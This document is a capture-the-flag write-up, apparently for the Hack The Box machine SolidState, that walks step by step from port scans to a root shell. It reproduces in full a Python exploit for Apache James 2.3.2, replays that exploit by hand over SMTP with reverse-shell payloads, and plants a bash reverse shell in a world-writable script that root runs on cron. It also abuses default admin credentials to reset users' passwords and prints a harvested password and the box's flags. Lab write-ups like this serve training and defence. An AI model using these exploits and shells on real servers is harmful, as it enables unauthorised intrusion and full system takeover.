### Summary
Port scans indicate a webserver and a suite of mail protocols. Nothing interesting on the webserver, but we inspect the mail protocols to discover `James 2.3.2` with default credentials, allowing us to list users and modify passwords. We discover default credentials in a mailbox and escape the user's bash sandbox utilizing `ssh -t bash` or exploiting a vulnerability in `James 2.3.2`. We then discover a `root` cron'd python script that's world-writable, providing us a reverse `root` shell

### Tools
- `feroxbuster`
- `telnet` - connecting to `POP3` and `SMTP`

##### [[#Recon]]
- [[#Initial Scan]]
- [[#Web - TCP 80]]
- [[#James Mail Server - TCP 25,110,119,4555]]
	- [[#RSIP - TCP 4555]]
	- [[#POP3 - TCP 110]]
##### [[#User Shell - mindy]]
- [[#Default SSH Creds]]
- [[#Recon]]
	- [[#SSH Sandbox Escape (Unintended)]]
	- [[#James 2.3.2 Exploit (Intended)]]
		- [[#POC]]
- [[#Enumeration]]
	- [[#tmp.py]]
	- [[#PSpy]]
##### [[#Root Shell]]
- [[#Modify tmp.py]]

---
# Recon
## Initial Scan
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vv 10.129.50.212 -oN nmap/tcp            
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
25/tcp   open  smtp    syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
110/tcp  open  pop3    syn-ack ttl 63
119/tcp  open  nntp    syn-ack ttl 63
4555/tcp open  rsip    syn-ack ttl 63

❯ sudo nmap -p 22,25,80,110,119,4555 -sCV -vv 10.129.50.212 -oN nmap/tcpScripts  
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey:
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE=
|   256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY
25/tcp   open  smtp?   syn-ack ttl 63
|_smtp-commands: Couldn\'t establish connection on port 25
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
110/tcp  open  pop3?   syn-ack ttl 63
119/tcp  open  nntp?   syn-ack ttl 63
4555/tcp open  rsip?   syn-ack ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- UDP scan showed nothing
- The TTL aligns with a posix adherent system
- `OpenSSH 7.4p1` indicates we're likely working with Debian 9 (2017)
- Nmap enumeration scripts didn't find the specifics of port `25`, `110`, `119`, and `4555` but we know that ports `25` and `110` are `SMTP` and `POP3` mail transfer and browsing protocols, we can enumerate manually later

## Web - TCP 80
---
- Navigating to the webpage directs us to Solid State Security's homepage
- On the root page theres an emasil submission feature that redirects us to the root page again
- We ran `feroxbuster` with `html,php,txt` extensions but nothing interesting showed up

## James Mail Server - TCP 25,110,119,4555
---
- We first want to take a look at `SMTP` on port `25` since `nmap` didn't get information on any of the other potentially mail ports
```sh
❯ nc 10.129.50.212 25                          
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Thu, 1 Jan 2026 16:52:21 -0500 (EST)
```
- We get something, `JAMES SMTP Server 2.3.2`

- We can probe `POP3` (Post Office Protocol) with netcat also:
```sh
❯ nc 10.129.50.212 110
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
```

- Now `NNTP` (Network News Transfer Protocol)
```sh
❯ nc 10.129.50.212 119
200 solidstate NNTP Service Ready, posting permitted
```

### RSIP - TCP 4555
- And now port `4555` 
```sh
❯ nc 10.129.50.212 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
```

- Looking up `JAMES Remote Administration Tool` shows an entry in exploitdb which we'll peek at later, but we also see that the default credentials are `root:root`
- We can give it a try here:
```sh
❯ nc 10.129.50.212 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP

Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user\'s password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user\'s current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user\'s email to another email address
showforwarding [username]               shows a user\'s current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

- We can get a list of users using the `listusers` command
```sh
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

- We can modify their passwords with the `setpassword` command, allowing us to inspect each user account!
```sh
setpassword james password
Password for james reset
setpassword thomas password
Password for thomas reset
setpassword john password
Password for john reset
setpassword mindy password
Password for mindy reset
setpassword mailadmin password
Password for mailadmin reset
```

### POP3 - TCP 110
- We can connect to `POP3` using `telnet` to inspect the inboxes of each user:
```sh
❯ telnet 10.129.3.180 110
Trying 10.129.3.180...
Connected to 10.129.3.180.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER james
+OK
PASS password
+OK Welcome james
LIST
+OK 0 0
.
```
- `james` has no emails stored, neither does `thomas`

```sh
❯ telnet 10.129.3.180 110
Trying 10.129.3.180...
Connected to 10.129.3.180.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER john
+OK
PASS password
+OK Welcome john
LIST
+OK 1 743
1 743
.
```
- We can use the `RETR [num]` command to read stored mail
```sh
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy\'s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.
```

# User Shell - mindy
## Default SSH Creds
---
- This is hinting us to peek at `mindy`'s account:
```sh
❯ telnet 10.129.3.180 110
Trying 10.129.3.180...
Connected to 10.129.3.180.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
USER mindy
+OK
PASS password
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security.

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login.
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
```
- Looks like we've got a potential password, `P@55W0rd1!2@`
- If we attempt to log in with `ssh`, it works!

## Recon
---
- We can nab the user flag from here:
```sh
mindy@solidstate:~$ cat user.txt 
d2d21d2e07eabbeaade1183e19dfde8d
```
- We notice pretty quickly the email was correct in that `mindy`'s shell is sandboxed, we don't have `sudo`, `cd`, `file`, most other commands and we're stuck in `rbash`

### SSH Sandbox Escape (Unintended)
- We can ensure that we're not sandboxed to `rbash` when we connect to `mindy` via `SSH` by performing the following:
```sh
❯ ssh mindy@10.129.3.180 -t bash     
echo $0
bash
```
- From here we could perform a shell upgrade with `python` or `script`

### James 2.3.2 Exploit (Intended)
- The key vulnerability for this version of `James` is that when a new user is created, a directory is also created for that user but there's no sanitization which allows for directory traversal (username like `../../../../../../fuck`)
	- Files with the contents of received emails are then sent in that directory
- This is semi-root write access, we can control the name of the directory but we can't control the names of the files that are then written to said directory
- We can utilize bash completion scripts to obtain arbitrary code execution
	- Bash completion scripts provide custom tab completion for various commands. For example, when one types `git stat[tab]`, it auto completes `git status` based on a git bash completion script that runs each time a session starts on one's host
	- By writing to `/etc/bash_completion.d`, when a user logs in, that user will run each file in there as a bash script.
#### POC
```python
#!/usr/bin/python
#
# Exploit Title: Apache James Server 2.3.2 Authenticated User Remote Command Execution
# Date: 16\10\2014
# Exploit Author: Jakub Palaczynski, Marcin Woloszyn, Maciej Grabiec
# Vendor Homepage: http://james.apache.org/server/
# Software Link: http://ftp.ps.pl/pub/apache/james/server/apache-james-2.3.2.zip
# Version: Apache James Server 2.3.2
# Tested on: Ubuntu, Debian
# Info: This exploit works on default installation of Apache James Server 2.3.2
# Info: Example paths that will automatically execute payload on some action: /etc/bash_completion.d , /etc/pm/config.d

import socket
import sys
import time

# specify payload
payload = 'sh -i >& /dev/tcp/10.10.15.147 0>&1'
# credentials to James Remote Administration Tool (Default - root/root)
user = 'root'
pwd = 'root'

if len(sys.argv) != 2:
    sys.stderr.write("[-]Usage: python %s <ip>\n" % sys.argv[0])
    sys.stderr.write("[-]Exemple: python %s 127.0.0.1\n" % sys.argv[0])
    sys.exit(1)

ip = sys.argv[1]

def recv(s):
        s.recv(1024)
        time.sleep(0.2)

try:
    print "[+]Connecting to James Remote Administration Tool..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,4555))
    s.recv(1024)
    s.send(user + "\n")
    s.recv(1024)
    s.send(pwd + "\n")
    s.recv(1024)
    print "[+]Creating user..."
    s.send("adduser ../../../../../../../../etc/bash_completion.d exploit\n")
    s.recv(1024)
    s.send("quit\n")
    s.close()

    print "[+]Connecting to James SMTP server..."
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,25))
    s.send("ehlo team@team.pl\r\n")
    recv(s)
    print "[+]Sending payload..."
    s.send("mail from: <'@team.pl>\r\n")
    recv(s)
    # also try s.send("rcpt to: <../../../../../../../../etc/bash_completion.d@hostname>\r\n") if the recipient cannot be found
    s.send("rcpt to: <../../../../../../../../etc/bash_completion.d>\r\n")
    recv(s)
    s.send("data\r\n")
    recv(s)
    s.send("From: team@team.pl\r\n")
    s.send("\r\n")
    s.send("'\n")
    s.send(payload + "\n")
    s.send("\r\n.\r\n")
    recv(s)
    s.send("quit\r\n")
    recv(s)
    s.close()
    print "[+]Done! Payload will be executed once somebody logs in."
except:
    print "Connection failed."
```
- We can use this POC as our guide to perform the exploit manually

```sh
❯ nc 10.129.3.180 4555      
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
adduser ../../../../../../../../etc/bash_completion.d exploit
User ../../../../../../../../etc/bash_completion.d added
```
```sh
❯ telnet 10.129.3.180 25
Trying 10.129.3.180...
Connected to 10.129.3.180.
Escape character is '^]'.
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Wed, 28 Jan 2026 11:22:23 -0500 (EST)
ehlo team@team.pl
250-solidstate Hello team@team.pl (10.10.15.147 [10.10.15.147])
250-PIPELINING
250 ENHANCEDSTATUSCODES
mail from: <'@team.pl>
250 2.1.0 Sender <'@team.pl> OK
rcpt to: <../../../../../../../../etc/bash_completion.d>
250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d@localhost> OK
data
354 Ok Send data ending with <CRLF>.<CRLF>
From: team@team.pl

'
sh -i >& /dev/tcp/10.10.15.147/12345 0>&1

.
250 2.6.0 Message received
quit
221 2.0.0 solidstate Service closing transmission channel
Connection closed by foreign host.
```

- When we log in as `mindy` via `SSH` again, we get an error from the `nc` listener:
```sh
❯ nc -lvnp 12345        
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.3.180.
Ncat: Connection from 10.129.3.180:38138.
: ambiguous redirect
```
- And from `mindy`'s shell:
```sh
❯ ssh mindy@10.129.3.180
mindy@10.129.3.180's password:
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jan 28 10:52:52 2026 from 10.10.15.147
-rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
-rbash: L: command not found
-rbash: attributestLjava/util/HashMap: No such file or directory
-rbash: L
         errorMessagetLjava/lang/String: No such file or directory
-rbash: L
         lastUpdatedtLjava/util/Date: No such file or directory
-rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
-rbash: $'L\004nameq~\002L': command not found
-rbash: recipientstLjava/util/Collection: No such file or directory
-rbash: L: command not found
-rbash: $'remoteAddrq~\002L': command not found
-rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
-rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
-rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
-rbash: @team.pl>
Message-ID: <12129953.0.1769617474199.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
Received: from 10.10.15.147 ([10.10.15.147])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 266
          for <../../../../../../../../etc/bash_completion.d@localhost>;
          Wed, 28 Jan 2026 11:23:18 -0500 (EST)
Date: Wed, 28 Jan 2026 11:23:18 -0500 (EST)
From: team@team.pl

: No such file or directory
-rbash: $'\r': command not found
```
- The error is likely stemming from the manual input
- We can try again with the `nc -e` reverse shell:
```sh
❯ telnet 10.129.3.180 25
Trying 10.129.3.180...
Connected to 10.129.3.180.
Escape character is '^]'.
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Wed, 28 Jan 2026 11:31:21 -0500 (EST)
ehlo fuck
250-solidstate Hello fuck (10.10.15.147 [10.10.15.147])
250-PIPELINING
250 ENHANCEDSTATUSCODES
mail from: <'fuck@fuck>
250 2.1.0 Sender <'fuck@fuck> OK
rcpt to: <../../../../../../../../etc/bash_completion.d>
250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d@localhost> OK
data
354 Ok Send data ending with <CRLF>.<CRLF>
From: fuck@fuck
'
/bin/nc -e /bin/bash 10.10.15.147 9988
.
250 2.6.0 Message received
quit
221 2.0.0 solidstate Service closing transmission channel
Connection closed by foreign host.
```

## Enumeration
---
- Even after escaping the bash sandbox, there is no access to the `sudo` command
- There's no `crontab` for `mindy`
- We can see from the home directory that there's another user on the box, `james`. Their home directory has nothing interesting
- Nothing interesting in `/var/www`, just the `html` directory and nothing new here
- The `/srv` directory is empty which is common for HTB boxes, but `/opt` has `james-2.3.2` and a `tmp.py` file
### tmp.py
```sh
$mindy@solidstate:~$ cat /opt/tmp.py 
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```
- Inspecting `/tmp` shows its empty, indicating this may be a cron'd script
- We can verify with `PSpy` (need to grab 32-bit for this box)
### PSpy
```sh
2026/01/28 11:48:01 CMD: UID=0     PID=3336   | /bin/sh -c python /opt/tmp.py 
2026/01/28 11:48:01 CMD: UID=0     PID=3337   | sh -c rm -r /tmp/*  
```
- After waiting a bit, we can see that the python script is being invoked by the root user!

# Root Shell
## Modify tmp.py
---
```python
#!/usr/bin/env python
import os
import sys
os.system('bash -c "bash -i >& /dev/tcp/10.10.15.147/12345 0>&1"')
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```
- We can add a reverse bash shell with `os.system` in the script to ensure that we call our `netcat` listener to get a `root` shell!

```sh
❯ nc -lvnp 12345
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::12345
Ncat: Listening on 0.0.0.0:12345
Ncat: Connection from 10.129.3.180.
Ncat: Connection from 10.129.3.180:38158.
bash: cannot set terminal process group (3492): Inappropriate ioctl for device
bash: no job control in this shell
root@solidstate:~# ls
ls
root.txt
root@solidstate:~# cat root.txt
cat root.txt
db7111663638ff003ab87a025cd5a132
```



